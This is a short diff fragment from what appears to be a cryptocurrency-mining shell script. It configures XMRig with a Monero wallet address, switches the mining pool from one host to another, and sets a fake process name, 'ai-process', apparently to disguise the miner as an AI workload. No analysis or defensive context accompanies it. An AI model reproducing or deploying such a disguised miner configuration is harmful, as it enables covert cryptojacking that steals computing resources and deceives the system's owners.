@@ -1,6 +1,6 @@
 
 FAKE_NAME="ai-process"
-POOL_URL="pool.hashvault.pro:443"
+POOL_URL="pool.supportxmr.com:443"
 WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
 LOG_FILE="./xmrig.log"
 RESTART_COUNT=0
